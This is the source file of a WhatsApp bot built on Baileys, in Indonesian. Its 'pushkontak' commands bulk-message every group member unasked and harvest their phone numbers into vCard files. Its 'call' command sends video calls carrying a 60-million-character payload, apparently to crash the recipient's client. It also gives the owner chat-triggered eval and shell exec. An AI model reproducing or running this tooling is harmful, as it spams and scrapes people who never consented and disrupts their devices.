
/* Fernazer Code Base */

require('../setting/config');
const fs = require('fs');
const util = require("util");
const moment = require("moment-timezone");
const crypto = require("crypto")
const {
  spawn,
  exec, 
  execSync 
} = require('child_process');

const { 
  default:
  baileys,
  proto, 
  generateWAMessage,
  generateWAMessageFromContent,
  getContentType, 
  prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
const { ok } = require('assert');

module.exports = client = async (client, m, chatUpdate, store) => {
  try {
    const body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
         m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
    const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id : m.key.participant || m.key.remoteJid;
    const senderNumber = sender.split('@')[0];
    const budy = (typeof m.text === 'string' ? m.text : '');
    const prefa = ["", "!", ".", ",", "🐤", "🗿"];
    const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
    const from = m.key.remoteJid;
    const isGroup = from.endsWith("@g.us");
    const kontributor = JSON.parse(fs.readFileSync('./fernazer-base/lib/database/owner.json'));

    const botNumber = await client.decodeJid(client.user.id);
    const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
    const isCmd = body.startsWith(prefix);
    const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
    const reaction = body.slice(1).trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const text = q = args.join(" ");
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    const qmsg = (quoted.msg || quoted);
    const isMedia = /image|video|sticker|audio/.test(mime);

    const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = isGroup ? await groupMetadata.participants : "";
    const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
    const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

    const { 
      smsg,
      formatSize,
      isUrl,
      generateMessageTag,
      getBuffer,
      getSizeMedia,
      runtime,
      fetchJson,
      sleep 
    } = require('./lib/myfunction');

    const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
    const tekspembuka = `Aku Adalah Bot Yang Di Buat Oleh Mizzuu.html`;
     
try {
    var ppuser = await client.profilePictureUrl(m.sender, 'image');
} catch (err) {
    var ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg';
    var mini = 'https://files.catbox.moe/p4g53y.jpg';
}
    let thumbmini = await getBuffer(ppuser);
    const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
    const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Mizzuu • Assistant`,jpegThumbnail: `${global.thumbnail}`}}}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
    
    if (m.message) {
      console.log('\x1b[30m--------------------\x1b[0m');
      console.log('\x1b[1m\x1b[41m\x1b[97m▢ New Message\x1b[0m');
      console.log('\x1b[42m\x1b[30m' +
    `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
    `   ⌬ Pengirim: ${m.pushname} \n` +
    `   ⌬ JID: ${senderNumber}\x1b[0m`
  );

    if (m.isGroup) {
      console.log('\x1b[42m\x1b[30m' +
      `   ⌬ Grup: ${groupName} \n` +
      `   ⌬ GroupJid: ${m.chat}\x1b[0m`
    );
  }

  console.log();
}
const statuslinkgc = true

switch (command) {
  case '👍🏻':{
      m.reply('hai')
  }break
  case 'menu':{
client.sendMessage(m.chat,{react:{text:'🧾', key:m.key}})
      const sopo = `
Hai @${sender.split("@")[0]}

${tekspembuka}
=========================

*${global.simbol} Info Bot :*
- *BotName : ${global.botname}*
- *BotVersion : ${global.version}*
- *Status : ${client.public ? 'public' : 'self'}*
- *Runtime : ${runtime.d}*
- *Developer : ${global.ownername}*

=========================

*${global.simbol} List Menu Owner :*
* self
* public
* pushkontakidgc
* pushkontakgcjd
* pushkontak
* call


*${global.simbol} List Menu Fun :*
* kerangajaib
* cekkhodam


*${global.simbol} List Menu Users :*
* req


*${global.simbol} List Menu Bug :*
* ~undefined~ (Coming Soon)


Terimakasih Sudah Memakai Product Mizzuu
`
await client.sendMessage(m.key.remoteJid, {document: fs.readFileSync('./package.json'),mimetype:"image/jpg",fileName: `${global.version}`,jpegThumbnail: thumbmini, fileLength: '99999999999', caption: sopo,
contextInfo: {mentionedJid: [m.sender,global.owner], externalAdReply: {showAdAttribution: true, thumbnailUrl: global.thumbnail, title: `© ${global.botname}`, body: `${global.version}`, sourceUrl: `${global.github}`, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
      client.sendMessage(m.key.remoteJid,{audio:{url:'https://files.catbox.moe/jtj250.mp3'}, mimetype:'audio/mpeg', ptt:true}, {quoted:m})
  }
  break
case 'kerangajaib':{
    await client.sendMessage(m.key.remoteJid, {text: mess.malas,
contextInfo: {mentionedJid: [m.sender], externalAdReply: {showAdAttribution: true, thumbnailUrl: global.thumbnail, title: `© ${global.botname}`, body: global.version, sourceUrl: global.github, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
}
break
case 'cekkhodam':{
    await client.sendMessage(m.key.remoteJid, {text: mess.malas,
contextInfo: {mentionedJid: [m.sender], externalAdReply: {showAdAttribution: true, thumbnailUrl: global.thumbnail, title: `© ${global.botname}`, body: global.version, sourceUrl: global.github, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
}
break
case 'undefined':{
    await client.sendMessage(m.key.remoteJid, {text: mess.malas,
contextInfo: {mentionedJid: [m.sender], externalAdReply: {showAdAttribution: true, thumbnailUrl: global.thumbnail, title: `© ${global.botname}`, body: global.version, sourceUrl: global.github, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
}
break
case "pushkontakgcjd": {
    let t = text.split("|");
    
if (!kontributor) return m.reply(msg.owner)
if (!isGroup) return m.reply(`khusus di group`)
    
    if(!text||!text.split("|").length>1) return m.reply(`Mana Text?\nExample: ${prefix+command} 30000 | text`);
    let jeda = t[0];
    let pesan = t[1];
    
    
var teks = pesan
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)

for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await client.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(jeda)
}}
await client.sendMessage(m.chat,{text:`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`},{quoted:m})
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [`
BEGIN:VCARD
VERSION:3.0
FN:WA[${createSerial(2)}] ${contact.split("@")[0]}
TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}
END:VCARD
"", `].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact All Member Berhasil Dikirim In Self Chat `)
await client.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contactsMember.vcf", caption: "File Contact All Member Berhasil Di Buat, Silahkan Download & Simpan Di Kontak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "self": {
if (!Access) return m.reply('Lu Bukan Owner')
client.public = false
m.reply(`Berhasil mengganti ke mode *${command}*`)
}
break
case "public": {
if (!Access) return m.reply('Lu Bukan Owner')
client.public = true 
m.reply(`Berhasil mengganti ke mode *${command}*`)
}
break
case 'listproduk':
        case 'mylist':{
    const tek = fs.readFileSync('./setting/list.txt')
    const lis = tek
    await client.sendMessage(m.chat,{text:lis},{quoted:m})
    
}
break
case 'req':{
    if(!text) return m.reply(`Enter Your Text Request\n\nExample = '${prefix+command} CekJodoh'`)
    const to = `${global.owner}@s.whatsapp.net`
    const pesan = `Hai Owner Ku
Kamu Dapat Pesan Nih Dari(@${sender.split("@")[0]})
=====================================
Message :
${text}`
    await client.sendMessage(to, {text:pesan, contextInfo:{mentionedJid:[m.sender]}},{quoted:m})
    await client.sendMessage(to, {audio:fs.readFileSync('./setting/angklung kane.mp3'), mimetype: 'audio/mpeg', ptt:true})
    m.reply('\nText Sudah Terkirim Ke Owner, Nanti Akan Di Proses Secepatnya\n')
}
break
case "pushkontak": {
if (!kontributor) return m.reply(msg.owner)
if (!isGroup) return m.reply(`khusus di group`)
if (!text) return m.reply("pesannya")
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await client.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [`
BEGIN:VCARD
VERSION:3.0
FN:WA[${createSerial(2)}] ${contact.split("@")[0]}
TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}
END:VCARD
"", `].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact All Member Berhasil Dikirim In Self Chat `)
await client.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contactsMember.vcf", caption: "File Contact All Member Berhasil Di Buat, Silahkan Download & Simpan Di Kontak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case 'call': {
    if(!Access && !kontributor)return m.reply('Khusus Mizzuu Rek')
    if (args.length < 1) {
        return m.reply(`Pilih:\n${prefix + command} @tag\n\n${prefix + command} grup`);
    }

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            await client.offerCall(m.mentionedJid[i], {isVideo: true, callOutCome: "8".repeat(60000000)})             
            client.sendMessage(m.chat, { text: mess.done }, { quoted: m });
        }
    } else {
        await client.offerCall(sender, {isVideo: true, callOutCome: "8".repeat(60000000)})
        client.sendMessage(m.chat, { text: `menelpon grup` }, { quoted: m });
    }
}
break
case "pushkontakidgc": {
if (!kontributor) return m.reply(mess.owner)
if (!text) return m.reply("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup")
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await client.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await client.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "listgc": case "listgrup": {
let teks = `\n *#- List all group chat*\n`
let a = await client.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Tertutup"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break
  default:
    if (budy.startsWith('>')) {
      if (!Access) return;
      try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
      } catch (err) {
        m.reply(String(err));
      }
    }
        
    if (budy.startsWith('<')) {
      if (!Access) return
        let kode = budy.trim().split(/ +/)[0]
          let teks
            try {
              teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
            } catch (e) {
              teks = e
            } finally {
              await m.reply(require('util').format(teks))
            }
    }

    if (budy.startsWith('-')) {
      if (!Access) return         
      if (text == "rm -rf *") return m.reply("😹")
        exec(budy.slice(2), (err, stdout) => {
      if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)  
        })
      }
if(budy.includes('anj')){
    m.reply('hei')
}
         
  }
  } catch (err) {
    console.log(require("util").format(err));
  }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});
